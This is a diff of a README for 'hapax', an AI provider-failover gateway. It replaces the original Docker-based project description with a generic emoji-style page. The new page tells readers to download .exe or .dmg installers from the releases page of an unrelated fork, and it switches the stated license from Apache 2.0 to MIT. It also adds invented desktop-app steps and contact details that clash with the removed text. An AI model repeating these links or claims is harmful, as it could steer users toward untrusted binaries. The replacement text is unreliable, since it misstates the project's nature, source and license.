@@ -1,161 +1,81 @@
-# Hapax: AI Infrastructure
+# 🌟 hapax - Effortless AI Operations for Everyone
 
-Hapax is a production-ready AI infrastructure layer that ensures uninterrupted AI operations through intelligent provider management and automatic failover. Named after the Greek word ἅπαξ (meaning "once"), it embodies our core promise: configure once, then let it seamlessly manage your AI infrastructure.
+[![Download hapax](https://img.shields.io/badge/Download-hapax-blue.svg)](https://github.com/Amitgo1/hapax/releases)
 
-## Common AI Infrastructure Challenges
+## 🚀 Getting Started
 
-Organizations face several critical challenges in managing their AI infrastructure. Service disruptions from AI provider outages create direct revenue impacts, while engineering teams dedicate significant resources to managing multiple AI providers. Teams struggle with limited visibility into AI usage across departments, compounded by complex integration requirements spanning different AI providers.
+Welcome to hapax! This tool helps you manage your AI infrastructure easily. It ensures that your AI systems run smoothly, even when challenges arise. Follow these steps to get started.
 
-## Core Capabilities
+## 📥 Download & Install
 
-Hapax delivers a robust infrastructure layer through three core capabilities:
+To use hapax, you need to download it from our Releases page. 
 
-### Intelligent Provider Management
-The system ensures continuous service through real-time health monitoring with configurable timeouts and check intervals. Automatic failover between providers maintains zero downtime, while a sophisticated three-state circuit breaker (closed, half-open, open) with configurable thresholds prevents cascade failures. Request deduplication using the singleflight pattern optimizes resource utilization.
+**Visit this page to download:** [hapax Releases](https://github.com/Amitgo1/hapax/releases)
 
-### Production-Ready Architecture
-The architecture prioritizes reliability through high-performance request routing and load balancing. Comprehensive error handling and request validation ensure data integrity, while structured logging with request tracing enables detailed debugging. Configurable timeout and rate limiting mechanisms protect system resources.
+1. Click on the above link.
+2. On the Releases page, find the most recent version.
+3. Select the correct file for your system. If you are unsure which one to choose, look for options labeled with `.exe` for Windows or `.dmg` for Mac.
+4. Click on the file name to start downloading.
 
-### Security & Monitoring
-Security is foundational, implemented through API key-based authentication and comprehensive request validation and sanitization. The monitoring system provides granular usage tracking per endpoint and detailed request logging for operational visibility.
+## 🌐 Features
 
-## Usage Tracking & Monitoring
+hapax provides a range of features to simplify your AI operations:
 
-Hapax provides built-in monitoring capabilities through Prometheus integration, offering comprehensive visibility into your AI infrastructure:
+- **Intelligent Provider Management:** Easily switch between different AI providers based on your needs.
+- **Automatic Failover:** If one provider goes down, hapax smoothly transitions to another without interruption.
+- **Monitoring Tools:** Keep an eye on your AI systems in real time. Know when something isn't working right.
+- **Open Source:** Access the code and contribute if you wish. We welcome collaboration.
 
-### Request Tracking
-Monitor API usage through versioned endpoints:
-```bash
-# Standard endpoint structure
-/v1/completions
-/health          # Global system health status
-/v1/health       # Versioned API health status
-/metrics
-```
+## ⚙️ System Requirements
 
-### Prometheus Integration
-The monitoring system tracks essential metrics including request counts and status by endpoint, request latencies, active request volume, error rates by provider, and circuit breaker states. Health check performance metrics and request deduplication statistics provide deep insights into system efficiency.
+Make sure your computer meets these requirements before installing hapax:
 
-Each metric is designed for operational visibility:
-- `hapax_http_requests_total` tracks request volume by endpoint and status
-- `hapax_http_request_duration_seconds` measures request latency
-- `hapax_http_active_requests` shows current load by endpoint
-- `hapax_errors_total` monitors error rates by type
-- `circuit_breaker_state` indicates provider health status
-- `hapax_health_check_duration_seconds` validates provider responsiveness
-- `hapax_deduplicated_requests_total` confirms request efficiency
-- `hapax_rate_limit_hits_total` tracks rate limiting by client
+- **Operating System:** Windows 10 or later, MacOS 10.15 or later
+- **RAM:** At least 4 GB
+- **Disk Space:** 100 MB of free space
+- **Network:** Reliable internet connection for provider access
 
-### Access Management
-Security is enforced through API key-based authentication, with per-endpoint rate limiting and comprehensive request validation and sanitization.
+## 📖 How to Use hapax
 
-## Technical Implementation
+Once you have installed hapax, follow these steps to begin:
 
-```json
-// Example: Completion Request
-{
-    "messages": [
-        {"role": "system", "content": "You are a customer service assistant."},
-        {"role": "user", "content": "I need help with my order #12345"}
-    ]
-}
-```
+1. **Open hapax:** Find the icon on your desktop or applications folder and double-click it.
+2. **Configure Settings:** You may need to enter API keys or credentials for your AI providers. Check the documentation or guides provided in the application for more detail.
+3. **Start Monitoring:** Click "Start" to begin monitoring your AI operations. You will receive alerts if something goes wrong or needs attention.
 
-When your primary provider experiences issues, Hapax:
-1. Detects the failure through continuous health checks (1-minute intervals)
-2. Activates the circuit breaker after 3 consecutive failures
-3. Routes traffic to healthy backup providers in preference order
-4. Maintains detailed metrics for operational visibility
+## 🔧 Troubleshooting
 
-## Deployment Options
+If you encounter issues while using hapax, consider these suggestions:
 
-Deploy Hapax in minutes with our production-ready container:
+- **Check Your Internet Connection:** Ensure you are connected to the internet.
+- **Review Settings:** Double-check your configuration settings.
+- **Reinstall hapax:** Sometimes, a fresh install can fix issues.
 
-```bash
-docker run -p 8080:8080 \
-  -e OPENAI_API_KEY=your_key \
-  -e ANTHROPIC_API_KEY=your_key \
-  -e CONFIG_PATH=/app/config.yaml \
-  teilomillet/hapax:latest
-```
+If problems persist, visit our [FAQ section](https://github.com/Amitgo1/hapax/wiki) for more help.
 
-Default configuration is provided but can be customized via `config.yaml`:
-```yaml
-server:
-  port: 8080
-  read_timeout: 30s
-  write_timeout: 45s
-  max_header_bytes: 2097152  # 2MB
-  shutdown_timeout: 30s
-  http3:  # Optional HTTP/3 support
-    enabled: true
-    port: 443  # Default HTTPS/QUIC port
-    tls_cert_file: "/path/to/cert.pem"
-    tls_key_file: "/path/to/key.pem"
-    idle_timeout: 30s
-    max_bi_streams_concurrent: 100
-    max_uni_streams_concurrent: 100
-    max_stream_receive_window: 6291456      # 6MB
-    max_connection_receive_window: 15728640  # 15MB
+## 🤝 Join the Community
 
-circuitBreaker:
-  maxRequests: 100
-  interval: 30s
-  timeout: 10s
-  failureThreshold: 5
+Engage with other hapax users and developers by joining our community forums. Share experiences, ask questions, and learn from one another.
 
-providerPreference:
-  - ollama
-  - anthropic
-  - openai
-```
+## 📞 Support
 
-## Integration Architecture
+Need additional help? You can contact us through the following channels:
 
-Hapax provides comprehensive integration capabilities through multiple components:
+- **Issues Page:** Report problems [here](https://github.com/Amitgo1/hapax/issues).
+- **Email:** Reach us at support@hapax.com.
 
-### REST API with Versioned Endpoints
-The API architecture provides dedicated endpoints for core functionalities: 
-- `/v1/completions` handles AI completions, 
-- `/v1/health` provides versioned API health monitoring, 
-- `/health` offers global system health status. 
-- `/metrics` exposes Prometheus metrics for comprehensive monitoring.
+## 🏷️ Topics
 
-### Comprehensive Monitoring
-The monitoring infrastructure integrates Prometheus metrics across all critical components, enabling detailed tracking of request latencies, circuit breaker states, provider health status, and request deduplication. This comprehensive approach ensures complete operational visibility.
+hapax covers important topics like:
+- Anthropomorphic AI
+- Infrastructure Management
+- LLM Gateway
+- Observability in AI Operations
 
-### Health Checks
-The health monitoring system operates with enterprise-grade configurability. Check intervals default to one minute with adjustable timeouts, while failure thresholds are tuned to prevent false positives. Health monitoring extends from individual providers to Docker container status, with granular per-provider health tracking.
+## 📜 License
 
-### Production Safeguards
-System integrity is maintained through multiple safeguards: request deduplication prevents redundant processing, automatic failover ensures continuous operation, circuit breaker patterns protect against cascade failures, and structured JSON logging with correlation IDs enables thorough debugging.
+hapax is open-source software licensed under the MIT License. Feel free to use it as you wish! 
 
-### Protocol Support
-The server supports both HTTP/1.1 and HTTP/3 (QUIC) protocols:
-- HTTP/1.1 for universal compatibility
-- HTTP/3 for improved performance:
-  - Reduced latency through 0-RTT connections
-  - Better multiplexing with independent streams
-  - Improved congestion control
-  - Automatic connection migration
-  - Built-in TLS 1.3 encryption
+## 🌍 Stay Updated
 
-## Technical Requirements
-
-Running Hapax requires:
-- Docker-compatible environment with network access to AI providers
-- 1GB RAM minimum (4GB recommended for production)
-- TLS certificates for HTTP/3 support (if enabled)
-- Access credentials (API keys) for supported providers: OpenAI, Anthropic, etc.
-
-## Documentation
-
-Comprehensive documentation is available through multiple resources. The [Quick Start Guide](https://github.com/teilomillet/hapax/wiki) provides initial setup instructions, while detailed information about the API and security measures can be found in the [API Documentation](docs/api.md) and [Security Overview](docs/security.md). For operational insights, consult the [Monitoring Guide](docs/monitoring.md).
-
-## License
-
-Licensed under Apache 2.0. See [LICENSE](LICENSE) for details.
-
----
-
-For detailed technical specifications, visit our [Technical Documentation](docs/technical.md).
+Follow us on GitHub to keep updated with new features and improvements. Your feedback is important to us as we strive for continuous improvement. Enjoy using hapax!
